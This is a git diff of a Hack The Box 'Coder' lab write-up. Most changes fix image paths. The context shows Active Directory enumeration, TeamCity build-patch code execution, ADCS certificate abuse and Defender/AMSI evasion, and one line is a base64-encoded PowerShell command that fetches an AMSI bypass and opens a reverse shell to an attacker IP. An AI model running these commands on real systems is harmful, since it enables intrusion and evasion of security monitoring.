@@ -90,7 +90,7 @@ The open ports indicate this is a Windows Domain Controller. Ports 135, 139, and
 
 Let's add the machine's host name to our /etc/hosts file:
 
-![](../Images/Pasted%20image%2020231210142331.png)
+![](Images/Pasted%20image%2020231210142331.png)
 
 Since we are dealing with Kerberos, a time critical protocol, let's sync our time to the machine:
 
@@ -104,7 +104,7 @@ Using CrackMapExec to enumerate shares:
 
 `cme smb 10.10.11.207 -u random -p '' --shares`
 
-![](../Images/Pasted%20image%2020231210223805.png)
+![](Images/Pasted%20image%2020231210223805.png)
 
 The server appears to allow anonymous authentication. There are two non-standard shares with which we have read access. CrackMapExec's spider_plus module maps every readable share's folders and files to a JSON file. Using jq, we are able to parse this document for any potentially useful files:
 
@@ -118,7 +118,7 @@ Nothing of importance found in the Users share. Development share contains `Migr
 
 Inspecting the web page returns Microsoft IIS default homepage.
 
-![](../Images/Pasted%20image%2020231211020414.png)
+![](Images/Pasted%20image%2020231211020414.png)
 
 No virtual hosts or subdirectories were discovered.
 
@@ -129,17 +129,17 @@ Running `file Encrypter.exe` reveals the executable to be a .NET assembly. The C
 
 There are plenty of tools that are able to decompile .NET assembly to its original source code, such as dnSpy and ILSpy. I opted to use the ilspy extension within visual studio code:
 
-![](../Images/Pasted%20image%2020231211042122.png)
+![](Images/Pasted%20image%2020231211042122.png)
 
 Looking through the source code, we are able to see that Encrypter program takes a file and AES encrypts it, creating a new file with a .enc extension. It's encryption key and iv are chosen at the time of encryption, using the current time as the seed for C#'s Random class:
 
-![](../Images/Pasted%20image%2020231211194044.png)
+![](Images/Pasted%20image%2020231211194044.png)
 
 This block of code presents two problems. The Random class is not truly random. It is a pseudo-random generator. It's "randomness" comes from a deterministic algorithm that generates based on a provided seed. If the seeds provided are unique, the provided output will be sufficiently random for all practical purposes. However, if a seed is discovered and reused, the algorithm will produce the same output. That leads us to our second problem. The use of ToUnixTimeSeconds() for the seed.
 
 The use of the system time for the seed of a pseudo-random number generator is a fairly common practice. This is not a problem if the time at generation is not easily identifiable. However, we are able to see the file's time stamps in the SMB share:
 
-![](../Images/Pasted%20image%2020231212050732.png)
+![](Images/Pasted%20image%2020231212050732.png)
 
 These timestamps are in the json file created by CrackMapExec's spider_plus module we ran earlier. The mtime here is likely the time the file was created. The size of the encrypted file is very small. It is highly likely it took less than a second for the Encrypter program to encrypt and write the file. The use of time again wouldn't be a problem as system time is capable of using 100-nanosecond time increments known as ticks, which would be different between the establishment of the DateTimeOffset and the writing of the encrypted file. However, the programmer used ToUnixTimeSeconds(). This limits the DateTimeOffset value to the second. ToUnixTimeMilliseconds() would have been a more secure choice for this program.
 
@@ -212,10 +212,10 @@ internal class AES
 
 I compiled and ran the program with mono. The program spat out `s.blade.dec`:
 
-![](../Images/Pasted%20image%2020231212063743.png)
+![](Images/Pasted%20image%2020231212063743.png)
 
 `7z l s.blade.7z`
-![](../Images/Pasted%20image%2020231212105836.png)
+![](Images/Pasted%20image%2020231212105836.png)
 
 The decrypted file is a 7-zip archive containing a KeePass database and what appears to be it's associated key.
 
@@ -224,18 +224,18 @@ KeePass is a secure open source password manager. It's databases are encrypted w
 If you have KeePass or KeePassXC, you can use either program to access this database with a gui interface. I opted to use kpcli to open it from the terminal. Providing the key file with no password was a success:
 
 `kpcli --kdb=s.blade.kdbx --key=.key`
-![](../Images/Pasted%20image%2020231212161311.png)
+![](Images/Pasted%20image%2020231212161311.png)
 
 The database provides us with two passwords and an encrypted authenticator secret. We also get a subdomain we can add to /etc/hosts.
 
-![](../Images/Pasted%20image%2020231212161524.png)
-![](../Images/Pasted%20image%2020231212161553.png)
-![](../Images/Pasted%20image%2020231212161626.png)
+![](Images/Pasted%20image%2020231212161524.png)
+![](Images/Pasted%20image%2020231212161553.png)
+![](Images/Pasted%20image%2020231212161626.png)
 
 The O365 credentials from the database provide us with valid domain credentials. We are ale to use these credentials to get a list of users from CrackMapExec:
 
 `cme smb dc01.coder.htb -u s.blade -p AmcwNO60Zg3vca3o0HDrTC6D --users`
-![](../Images/Pasted%20image%2020231213022901.png)
+![](Images/Pasted%20image%2020231213022901.png)
 
 We are also able to use these credentials with BloodHound.
 
@@ -246,26 +246,26 @@ Didn't have any success kerberoasting and wasn't able to find any path forward w
 
 Upon navigating to the url from the database, we are immediately greeted with a login screen:
 
-![](../Images/Pasted%20image%2020231213024742.png)
+![](Images/Pasted%20image%2020231213024742.png)
 
 Followed immediately by 2FA:
 
-![](../Images/Pasted%20image%2020231213024846.png)
+![](Images/Pasted%20image%2020231213024846.png)
 
 Most two-factor authentication methods utilize what's called a one-time password (OTP). OTPs are six-digit codes that are generated from a deterministic algorithm that takes two inputs, a static seed or secret, and a moving factor. This moving factor can be a counter that increments with every request such as through HOTP (HMAC-based OTP), or it can be time-based in the case of TOTP (Time-based OTP). According to the database, we are dealing with totp and we have the encrypted secret.
 
-![](../Images/Pasted%20image%2020231213030903.png)
+![](Images/Pasted%20image%2020231213030903.png)
 
 If we can find a way to decrypt the secret, we can generate our own code to authenticate through 2FA. FIrst step is to figure out how the secret is encrypted.
 
 Through some googling I found a github repository for what could potentially be the same authenticator app s.blade uses/
 
-![](../Images/Pasted%20image%2020231213035216.png)
+![](Images/Pasted%20image%2020231213035216.png)
 
 I verified this by installing it as a firefox extension and adding a test code. I then created a password protected backup file through the extension.
 
-![](../Images/Pasted%20image%2020231213035454.png)
-![](../Images/Pasted%20image%2020231213035553.png)
+![](Images/Pasted%20image%2020231213035454.png)
+![](Images/Pasted%20image%2020231213035553.png)
 
 Looks like the same output format to me.
 
@@ -396,7 +396,7 @@ rl.on('line', (password) => {
 
 When we try to run this code, we get a Malformed UTF-8 error:
 
-![](../Images/Pasted%20image%2020231214221036.png)
+![](Images/Pasted%20image%2020231214221036.png)
 
 AES decryption will take place regardless of the key provided. This error is likely due to the decrypted output not being able to be parsed as UTF-8. When the nodejs runtime throws an error, it crashes and halts the program. We can catch these errors to allow the program to continue. Let's also add output to the program so we can see it cycle through the words. This will be purely aesthetic. It is not necessary for the code to function.
 
@@ -446,12 +446,12 @@ rl.on('line', (password) => {
 
 Success!
 
-![](../Images/Pasted%20image%2020231214224422.png)
+![](Images/Pasted%20image%2020231214224422.png)
 
 We can either use the secret to generate the otp, or we can import the backup from the keepass database and plugin the password into the authenticator extension. Whichever you choose we now have the code to authenticate to the webserver.
 
-![](../Images/Pasted%20image%2020231215065359.png)
-![](../Images/Pasted%20image%2020231215065452.png)
+![](Images/Pasted%20image%2020231215065359.png)
+![](Images/Pasted%20image%2020231215065452.png)
 
 
 *Side note: It is generally considered bad programming practice to do nothing with caught errors like that. If you are going to use try and catch, you should do something with the errors you catch. But for the purposes of this small single-purpose program, it is fine and it served its purpose.*
@@ -465,15 +465,15 @@ TeamCity is a Continuous Integration Continuous Development (CI/CD) environment 
 
 Browsing the webapp, There is a Development_Testing project with a single build configuration. Running the build seems to execute a Hello World powershell script.
 
-![](../Images/Pasted%20image%2020231215070903.png)
-![](../Images/Pasted%20image%2020231215070927.png)
-![](../Images/Pasted%20image%2020231215071027.png)
+![](Images/Pasted%20image%2020231215070903.png)
+![](Images/Pasted%20image%2020231215070927.png)
+![](Images/Pasted%20image%2020231215071027.png)
 
 I don't see a way for us to create our own build, but we might be able achieve code execution through modifying the build with a diff patch.
 
-![](../Images/Pasted%20image%2020231215231834.png)
-![](../Images/Pasted%20image%2020231215231348.png)
-![](../Images/Pasted%20image%2020231215232009.png)
+![](Images/Pasted%20image%2020231215231834.png)
+![](Images/Pasted%20image%2020231215231348.png)
+![](Images/Pasted%20image%2020231215232009.png)
 
 The current build configuration executes a script named hello_word.ps1. One of the git repositories in the smb share was for a teamcity_test_repo with a hello_world.ps1. We can generate a diff file to change execution from a simple Hello World script to a reverse shell.
 
@@ -498,7 +498,7 @@ The purpose of the sed command is to ensure the file retains its original name. 
 
 After uploading and executing the patch, ConPtyShell didn't execute due to Windows Defender.
 
-![](../Images/Pasted%20image%2020231216000321.png)
+![](Images/Pasted%20image%2020231216000321.png)
 
 I decided to go with a simpler reverse shell to bypass AV. I used a modified Nishang one-liner.
 
@@ -528,7 +528,7 @@ Windows Defender is primarily signature based. It gets a lot of its signatures f
 
 The output of the above command is what gets passed to PowerShell for successful execution. We apply the patch one more time for a successful callback that does not timeout on us.
 
-![](../Images/Pasted%20image%2020231217092616.png)
+![](Images/Pasted%20image%2020231217092616.png)
 
 
 *Note: The Nishang reverse shell we used is very simple. There are a lot of limitations as a result. For instance there is no command history. There is no tab autocompletion. And errors are not printed to screen. ConPtyShell would have given us a proper shell with all three of those problems fixed. We could have modified the signatures of ConPtyShell in a similar way to bypass AV. However, I decided to hold off on using ConPtyShell for now and use it later to describe other AV evasion methods. After rooting the box I intend to include an additional section on more in-depth AV/AMSI evasion techniques to get ConPtyShell running.*
@@ -538,40 +538,40 @@ The output of the above command is what gets passed to PowerShell for successful
 
 Our foothold on the machine is as the user `svc_teamcity`
 
-![](../Images/Pasted%20image%2020231221024928.png)
+![](Images/Pasted%20image%2020231221024928.png)
 
 `svc_teamcity` is likely the service account used for running the webserver. Listing the `C:\Users` directory reveals the other user on the box to be `e.black`.
 
-![](../Images/Pasted%20image%2020231221025458.png)
+![](Images/Pasted%20image%2020231221025458.png)
 
 Our earlier BloodHound enumeration revealed `e.black` to be able to use WinRM and to be a member of the PKI Admins group. WinRM would be useful for getting a more stable shell on the box, but I'm really interested in the potential permissions of the PKI Admins group. Since we are the service account for the TeamCity server, let's see if we can access the TeamCity database. We might be able to get the credentials for `e.black`.
 
 Looking around the TeamCity directory, I was unable to find a database. Checking documentation, I found information about the database.
 
-![](../Images/Pasted%20image%2020231222042813.png)
+![](Images/Pasted%20image%2020231222042813.png)
 
 Whether an internal or external database is used, valuable data is likely to be in the `<TeamCity Data Directory>`. Let's see if we can figure out the directory. We'll also check to see if the website is using an internal or external database while we are at it.
 
-![](../Images/Pasted%20image%2020231222043146.png)
+![](Images/Pasted%20image%2020231222043146.png)
 `Get-Content teamcity-server.log | Select-String SQL`
-![](../Images/Pasted%20image%2020231222043500.png)
+![](Images/Pasted%20image%2020231222043500.png)
 
 The above output reveals the server appears to be using the internal database.
 
-![](../Images/Pasted%20image%2020231222051950.png)
-![](../Images/Pasted%20image%2020231222052036.png)
-![](../Images/Pasted%20image%2020231222052251.png)
+![](Images/Pasted%20image%2020231222051950.png)
+![](Images/Pasted%20image%2020231222052036.png)
+![](Images/Pasted%20image%2020231222052251.png)
 
 And it looks like the data directory is in `C:\ProgramData\JetBrains\TeamCity`. I found the e.black hash in the `buildserver.data` database file under the system directory.
 
-![](../Images/Pasted%20image%2020231222054146.png)
+![](Images/Pasted%20image%2020231222054146.png)
 `Get-Content buildserver.data | Select-String black`
-![](../Images/Pasted%20image%2020231222054417.png)
+![](Images/Pasted%20image%2020231222054417.png)
 
 Unfortunately I wasn't able to crack the hash. Let's see what else we can find in the `system` directory.
 
 `Get-ChildItem -Recurse | Select-String e.black`
-![](../Images/Pasted%20image%2020231222062645.png)
+![](Images/Pasted%20image%2020231222062645.png)
 
 It looks like there is a diff file with a PSCredential Object. Let's check out the entire file and see what's going on
 
@@ -673,9 +673,9 @@ Now let's get our PSCredential
 
 Now we have what we need for the clear text password
 
-![](../Images/Pasted%20image%2020231222073821.png)
+![](Images/Pasted%20image%2020231222073821.png)
 
-![](../Images/Pasted%20image%2020231222074225.png)
+![](Images/Pasted%20image%2020231222074225.png)
 
 
 ## Privilege Escalation
@@ -683,7 +683,7 @@ Now we have what we need for the clear text password
 Now that we have access to a member of the PKI Admins group, let's see what we can do with ADCS. I opted to use the Certipy tool. An initial search for vulnerable templates returned nothing:
 
 `certipy find -json -vulnerable -dc-ip 10.10.11.207 -ns 10.10.11.207 -u e.black@coder.htb -p ypOSJXPqlDOxxbQSfEERy300`
-![](../Images/Pasted%20image%2020231222214310.png)
+![](Images/Pasted%20image%2020231222214310.png)
 
 Let's instead search through all templates and see if the PKI Admins group has any permissions over any of the templates. If we have any write permissions, we can modify a template to be vulnerable. We can use the same command as above but remove the `-vulnerable` flag.
 
@@ -693,7 +693,7 @@ Certipy returned 33 templates. Using jq, we can list permissions for all templat
 
 Only `Enterprise Admins`, `Domain Admins`, and `Administrator` have any object control permissions over any of the templates.
 
-![](../Images/Pasted%20image%2020231222225836.png)
+![](Images/Pasted%20image%2020231222225836.png)
 
 The description for `PKI Admins` is "ADCS Certificate and Template Management", so we have to have some control. Let's check permissions on the Certificate Template Configuration container. We'll use bloodyAD for that.
 
@@ -747,8 +747,8 @@ Looking at the output above, `PKI Admins` has GENERIC_WRITE and CREATE_CHILD per
 
 After some research online, I stumbled onto the github page for ADCSTemplate:
 
-![](../Images/Pasted%20image%2020231223080422.png)
-![](../Images/Pasted%20image%2020231223080549.png)
+![](Images/Pasted%20image%2020231223080422.png)
+![](Images/Pasted%20image%2020231223080549.png)
 
 This should allow us to do what we need to do. To use the module, we will utilize Evil-WinRM. Evil-WinRM has built in capabilities to remotely import powershell scripts. To do so, when running your Evil-WinRM command, use the `-s` flag to specify the directory your PowerShell script is in.
 
@@ -756,7 +756,7 @@ This should allow us to do what we need to do. To use the module, we will utiliz
 
 Once connected, to access the script you just have to type it's name in the prompt. You can then type `menu` to see your new imported commands.
 
-![](../Images/Pasted%20image%2020231223081155.png)
+![](Images/Pasted%20image%2020231223081155.png)
 
 The `New-ADCSTemplate` cmdlet creates a new template based on JSON input. There is a lot to configure with these templates. The easiest way create a vulnerable template would be to use the `Export-ADCSTemplate` cmdlet to output another template into JSON and change the values we want to make it vulnerable to ESC1. We can then run `New-ADCSTemplate` on our modified JSON to create and publish the vulnerable template. We can then exploit the template with Certipy.
 
@@ -766,45 +766,45 @@ For the export, I decided to go with the `User` template. Any template should wo
 
 HackTricks on their ADCS Domain Escalation page has a list of what must be set for a template to be vulnerable to ESC1.
 
-![](../Images/Pasted%20image%2020231223084552.png)
+![](Images/Pasted%20image%2020231223084552.png)
 
 Looking at our Certipy output from earlier again, the only thing the User template doesn't have for ESC1 is the `CT_FLAG_ENROLLE_SUPPLIES_SUBJECT` flag
 
-![](../Images/Pasted%20image%2020231223085308.png)
+![](Images/Pasted%20image%2020231223085308.png)
 
 This flag is set in the `mspki-certificate-name-flag` property. Our exported template has this property set to `-1509949440`
 
-![](../Images/Pasted%20image%2020231223225752.png)
+![](Images/Pasted%20image%2020231223225752.png)
 
 Let's figure out what we have to set it to. I found official documentation on the `msPKI-Certificate-Name-Flag` attribute on the official Microsoft website.
 
-![](../Images/Pasted%20image%2020231223230023.png)
+![](Images/Pasted%20image%2020231223230023.png)
 
 The flag for `CT_FLAG_ENROLLEE_SUPPLIE_SUBJECT` above is just 1 in decimal. Let's update the attribute in our PowerShell variable.
 
-![](../Images/Pasted%20image%2020231223230441.png)
+![](Images/Pasted%20image%2020231223230441.png)
 
 We should have everything we need to create our new template. For simplicity, we'll create it under the name User2.
 
 `New-ADCSTemplate -JSON (ConvertTo-Json $tmplt) -DisplayName User2 -Identity 'coder\e.black' -Publish`
-![](../Images/Pasted%20image%2020231223231059.png)
+![](Images/Pasted%20image%2020231223231059.png)
 
 Now let's check Certipy again to see if it can find our vulnerable template.
 
-![](../Images/Pasted%20image%2020231223231412.png)
-![](../Images/Pasted%20image%2020231223231522.png)
+![](Images/Pasted%20image%2020231223231412.png)
+![](Images/Pasted%20image%2020231223231522.png)
 
 Success! Now let's use Certipy to exploit it.
 
 `certipy req -ca coder-dc01-ca -template User2 -upn administrator@coder.htb -dc-ip 10.10.11.207 -ns 10.10.11.207 -u e.black@coder.htb -p ypOSJXPqlDOxxbQSfEERy300`
-![](../Images/Pasted%20image%2020231224071338.png)
+![](Images/Pasted%20image%2020231224071338.png)
  We can the use Certipy to authenticate to the DC with the generated pfx certificate.
 
 `certipy auth -pfx administrator.pfx -dc-ip 10.10.11.207 -ns 10.10.11.207 -domain coder.htb`
-![](../Images/Pasted%20image%2020231224072202.png)
+![](Images/Pasted%20image%2020231224072202.png)
 `cme smb dc01.coder.htb -u administrator -H 807726fcf9f188adc26eeafd7dc16bb7 -x whoami`
-![](../Images/Pasted%20image%2020231224072431.png)
-![](../Images/Pasted%20image%2020231224072830.png)
+![](Images/Pasted%20image%2020231224072431.png)
+![](Images/Pasted%20image%2020231224072830.png)
 
 We are given a TGT ccache file and the NTLM hash for the Administrator user. We are able to use either to authenticate as Administrator. You can grab root.txt however you wish. User.txt is in the `e.black` user directory. The Insane machine Coder has been Pwned!
 
@@ -820,7 +820,7 @@ In addition to providing us a fully interactive shell, bypassing Defender the wa
 Before we talk about bypassing AMSI, we should talk a little about what AMSI is. *Antimalware Scan Interface*. It is Microsoft's vendor-agnostic answer to the difficulties Defender and other traditional AntiVirus (AV) solutions had in detecting fileless attacks. Before AMSI, Defender would scan files on disk looking for malicious signatures. Scripting languages (such as PowerShell, JavaScript, Python, and Perl) executing scripts not written to disk, and .NET assemblies loaded into memory had high success rates with bypassing this type of detection. AMSI is able to capture scripts before they are passed to the scripting engine for execution and checks them against Defender before allowing execution to continue. .NET is also able use AMSI to do this for assemblies loaded into memory. This gives Defender a much greater ability to identify and flag on signatures from scripts and other in-memory execution it otherwise would have been unable to detect.
 ## How does AMSI Work?
 
-![](../Images/Pasted%20image%2020231230235344.png)
+![](Images/Pasted%20image%2020231230235344.png)
 
 To further help us understand bypassing AMSI, let's also briefly get a quick overview on how AMSI works. The picture above is provided by Microsoft documentation on their website and illustrated AMSI's architecture. To explain this image a little bit, AMSI acts as a bridge, connecting various applications to a desired AV provider through the AMSI interface. To access this interface, the application loads `AMSI.dll` into memory. This DLL file hosts a number of functions the application can use to utilize AMSI. If you look at he Win32API Layer in the picture above you should see two of these functions mentioned, `AmsiScanBuffer` and `AmsiScanString`. Two other important ones we will talk about are `AmsiInitialize` and `AmsiUninitialize`.
 
@@ -1015,7 +1015,7 @@ One more thing, in the original code I wrote, I set the memory region to **0x40*
 
 Now that we have our bypass, time to start putting it into action. First, we're going to compile to code into a DLL. I used mono.
 
-![](../Images/Pasted%20image%2020240103215024.png)
+![](Images/Pasted%20image%2020240103215024.png)
 
 Next. We'll start working on a powershell script to execute this DLL for us. The end goal is to use this script as diff patch to get command execution from the TeamCity server. We are going to recreate our initial access.
 
@@ -1032,7 +1032,7 @@ Now if we try to execute ConPtyShell, we are still going to get an error. Defend
 
 Regardless of the reason, the fix is simply to modify the ConPtyShell script to use Reflection instead of `Add-Type`. Using Reflection would both guarantee the shell gets run under the current process and that nothing is written to disk. The modification should be fairly straight forward. The github for ConPtyShell comes with the C# source code. Let's also compile it into a DLL and host it on our python webserver.
 
-![](../Images/Pasted%20image%2020240104162234.png)
+![](Images/Pasted%20image%2020240104162234.png)
 
 Now, let's modify `Invoke-ConPtyShell.ps1` to use Reflection.
 
@@ -1074,8 +1074,8 @@ Now, let's convert our earlier AMSI bypass script to Base64 to run it as a backg
 -write-host "Hello, World!"
 +Start-Process powershell -ArgumentList '-nop -w hidden -exec bypass -enc JABhAHMAcwBlAG0AYgBsAHkAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQARABhAHQAYQAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADQALgA1AC8AQQBtAHMAaQAuAGQAbABsACIAKQAKAFsAUwB5AHMAdABlAG0ALgBSAGUAZgBsAGUAYwB0AGkAbwBuAC4AQQBzAHMAZQBtAGIAbAB5AF0AOgA6AEwAbwBhAGQAKAAkAGEAcwBzAGUAbQBiAGwAeQApAAoAWwBBAG0AcwBpAF0AOgA6AEIAeQBwAGEAcwBzACgAKQAKAEkARQBYACgASQBXAFIAIABoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADUALwBJAG4AdgBvAGsAZQAtAEMAbwBuAFAAdAB5AFMAaABlAGwAbAAuAHAAcwAxACAALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwApADsAIABJAG4AdgBvAGsAZQAtAEMAbwBuAFAAdAB5AFMAaABlAGwAbAAgADEAMAAuADEAMAAuADEANAAuADUAIAA4ADQANAAzAAoA'
 ```
-![](../Images/Pasted%20image%2020240105003649.png)
-![](../Images/Pasted%20image%2020240105003732.png)
+![](Images/Pasted%20image%2020240105003649.png)
+![](Images/Pasted%20image%2020240105003732.png)
 
 Success!
 
@@ -1085,7 +1085,7 @@ Now there are many other ways of achieving the same goal. I decided on this way 
 
 When we had gone through the box earlier, we had used Bloodhound.py and Certipy with python to enumerate and exploit ADCS remotely. The Windows equivalents to these tools, SharpHound and Certify, are easily flagged by Defender. Because of this, it made more sense to use remote tools so we didn't have to contend with Defender. Now that we have AMSI bypassed, we can use Reflection to load these tools into memory and use them on the box.
 
-![](../Images/Pasted%20image%2020240105005514.png)
+![](Images/Pasted%20image%2020240105005514.png)
 
 I think I said earlier that the bypass would allow us to do a slightly different enumeration and privilege escalation path. Ultimately it's the same path, but we have the ability to use different tools.
 
